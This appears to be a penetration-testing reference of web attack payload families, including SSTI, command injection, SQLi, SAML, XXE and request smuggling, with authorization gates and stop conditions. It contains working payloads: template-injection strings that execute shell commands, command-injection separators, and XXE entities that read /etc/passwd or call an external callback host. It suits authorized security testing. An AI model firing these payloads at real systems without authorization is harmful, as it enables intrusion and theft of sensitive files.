# Payload Family References

Payloads here are conditional probe shapes. Do not fire every row. Select the smallest low-impact probe that matches the evidenced parser or feature, save the raw request/response, and stop when the next step would require destructive execution, bulk traffic, or real-user impact without current-turn authorization.

## 状态型链路连续性

对于 leak -> use、login -> token -> action、多轮 oracle、连接绑定协议和浏览器工作流，
所有相互依赖的步骤必须保持在同一进程、socket 或 browser context。只有前一步导出完整
session state、后一步显式恢复时，才可以拆分执行。默认把新的 shell/tool 调用视为新进程；
不得假设内存 token、连接、cookie jar、nonce、oracle 轮次或 heap/protocol state 会跨调用保留。

## SSTI Probe Ladder

| Probe shape | Expected signal | Notes |
|---|---|---|
| `{{7*7}}` | `49` in Jinja2/Twig-like engines | Low-impact arithmetic probe |
| `${7*7}` | `49` in Freemarker/Pebble/Velocity-like engines | Use when `${...}` syntax is accepted |
| `<%= 7*7 %>` | `49` in ERB-like engines | Use in Ruby template suspicion |
| `#{7*7}` | `49` in Mako or Ruby-like contexts | Context-dependent |
| `*{7*7}` | `49` in Thymeleaf-like contexts | Java/Spring suspicion |
| `{{7*'7'}}` | Engine differentiation | Jinja2-style string multiplication vs Twig behavior |

Where to test: profile text, email/template names, custom error messages, PDF/report generators, path parameters, and reflected search output. Choose based on observed reflection and template context.

## SSTI Gated RCE Examples

Use only after harmless arithmetic proves server-side evaluation and authorization allows deeper validation.

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

```php
{{["id"]|filter("system")}}
```

```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

```ruby
<%= `id` %>
```

Evidence gate: harmless evaluation -> engine identification -> controlled command output or read-back in a sandbox/lab/explicitly authorized target -> raw evidence. Prefer `id`/environment-neutral commands and never run destructive commands.

## Command Injection Probe Ladder

| Probe family | Example shape | Observation |
|---|---|---|
| Separator baseline | `; id`, `&& id`, `| id` | Output channel or syntax difference |
| Blind timing | `; sleep 3` | Bounded delay with stable baseline |
| OOB callback | controlled callback command | Requires authorized OOB listener |
| Space bypass | `${IFS}`, tabs, brace expansion | Only after a filter is evidenced |
| Keyword bypass | quote splitting, variable expansion | Only after blocked keyword evidence |

Stop if timing is noisy, endpoint is state-changing, or OOB would touch third-party infrastructure without approval.

## SQLi Confirmation Families

Use after a stable query-like input is identified. Start with baseline confirmation before DBMS-specific probes.

| Family | Signal | Stop condition |
|---|---|---|
| Error/type perturbation | Quote, numeric/string coercion, or malformed operator changes only the target field/query response | Errors are generic, unstable, or WAF-only |
| Boolean pair | Two equivalent-looking predicates produce true/false response differences | No stable length/status/field/sort delta |
| Sort/order delta | `ORDER BY` or sort direction changes result ordering | Sort is client-side or cached |
| Time confirmation | Bounded delay after boolean/error signal | Timing jitter hides the delta |
| Second-order | Store harmless marker, trigger downstream report/log/search path | No store+trigger path or real-user data required |

DBMS fingerprint is a helper, not a goal. Prefer response shape, error family, and feature syntax only after baseline/perturbation is stable.

## GraphQL Query Families

Use when GraphQL schema, node/global ID, mutation, or subscription behavior is evidenced.

| Family | Use when | Evidence gate |
|---|---|---|
| Introspection | Schema discovery is enabled | Treat as informational unless it exposes protected operations used in a chain |
| Node/global ID | REST object auth differs from `node(id:)` or relay IDs | Same object read/action differs across two owned identities |
| Field-level auth matrix | Type has public and private sibling fields | Protected field or mutation bypasses role/object boundary |
| Batching | Rate limit or auth check may apply per request, not per operation | Same request body with multiple operations changes enforcement |
| Subscription | Realtime events expose object/tenant state | Subscription leaks events across owned accounts/roles |

## SAML / XML SSO Families

Use only after a real SAML/OIDC/SSO flow is captured and replayable.

| Family | Signal | Evidence gate |
|---|---|---|
| XML Signature Wrapping | Signed assertion and unsigned attacker-controlled assertion coexist | Service consumes unsigned attacker-controlled identity while signature still validates |
| Comment injection | NameID or attribute parser splits on XML comments | Account binding changes to attacker-controlled identity |
| Signature stripping | Service accepts unsigned assertion | Authenticated session established without valid signature |
| XXE in assertion | XML parser resolves external entity | Controlled callback or harmless entity read-back |
| RelayState confusion | Callback state binds to wrong session/account | Code/session lands in attacker-controlled flow |

Keep raw SAMLRequest/SAMLResponse, decoded XML, replay request, and final session/account evidence.

## Deserialization / Signed Object Families

Use after a cookie, hidden field, ViewState, remember-me token, or API blob looks serialized.

| Family | First check | Evidence gate |
|---|---|---|
| Encoding map | Base64/url-safe/gzip/json/php/java/.NET marker | Stable decode/parse path |
| Integrity boundary | Single-byte tamper | Accepted vs rejected boundary proves signing/encryption behavior |
| State tamper | Low-impact owned-account field change | Server accepts changed role/tenant/feature/price state |
| Gadget reachability | Known class/function path in authorized lab/source-reviewed app | Controlled RCE or safe side effect with cleanup path |

Format recognition alone is not a finding. Integrity signature and state tamper come before gadget depth.

## CRLF / Response Splitting Families

Use when header/body construction reflects user input into response metadata.

| Family | Observation |
|---|---|
| Encoded newline | Response header boundary changes after one encoded CR/LF candidate |
| Header injection | New harmless header appears in raw response |
| Redirect splitting | `Location` or cache-related header changes downstream behavior |
| Cache connector | Injected header/body becomes cache key or cached response signal |

Evidence gate: raw response with header boundary proof and a connector such as cache, redirect, or cookie behavior.

## XXE Probe Families

Use when XML/SVG/Office/PDF conversion or parser behavior is evidenced.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://callback.example/xxe">]>
<foo>&xxe;</foo>
```

For uploads, preserve original archive/image/XML request, conversion output, and read-back evidence. Prefer harmless local file or controlled callback in labs; real targets require explicit authorization for sensitive file reads or OOB.

## HTTP Request Smuggling Probe Families

Keep smuggling checks scripted and evidence-oriented. Manual browser behavior alone is not enough.

| Family | Signal |
|---|---|
| CL.TE | Frontend trusts Content-Length, backend trusts Transfer-Encoding |
| TE.CL | Frontend trusts Transfer-Encoding, backend trusts Content-Length |
| TE.TE | One layer ignores obfuscated Transfer-Encoding |
| H2.CL | HTTP/2 frontend downgrades or forwards conflicting length |

Evidence gate: timeout/desync baseline, response queue poisoning or capture proof, cache/request-boundary proof if chaining, and raw request/response pairs.
